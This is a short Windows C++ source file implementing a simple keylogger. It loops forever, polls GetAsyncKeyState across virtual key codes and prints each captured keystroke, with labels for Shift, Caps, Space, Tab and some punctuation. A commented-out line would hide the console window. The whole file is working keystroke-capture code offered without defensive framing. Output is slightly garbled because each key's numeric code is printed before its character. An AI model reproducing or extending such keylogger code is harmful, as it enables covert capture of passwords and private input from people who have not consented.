#include <fstream>
#include <Windows.h>
#include <unistd.h>
#include <iostream>

int main() {
    // hide the window
    //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 

    // Run infinitely
    while(true) {
		for (int key = 8; key <= 190; key++)
		{    
            // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
            if (GetAsyncKeyState(key) == -32767) {
                std::cout << key;
                if (key == VK_SHIFT) {
                    std::cout << "[SHIFT]";
                } else if (key == VK_CAPITAL) {
                    std::cout << "[CAPS]";
                } else if (key == VK_SPACE) {
                    std::cout << "[SPACE]";
                } else if (key == VK_TAB) {
                    std::cout << "[TAB]";
                } else if (key == VK_OEM_PERIOD) {
                    std::cout << ".";
                } else if (key == VK_OEM_4) {
                    std::cout << "[";
                }  else if (key == VK_OEM_6) {
                    std::cout << "]";
                } else if (key == VK_OEM_PLUS) {
                    std::cout << "+";
                } else if (key == VK_OEM_MINUS) {
                    std::cout << "-";
                } else {
                    std::cout << char(key);
                }
            }
        }
    }
}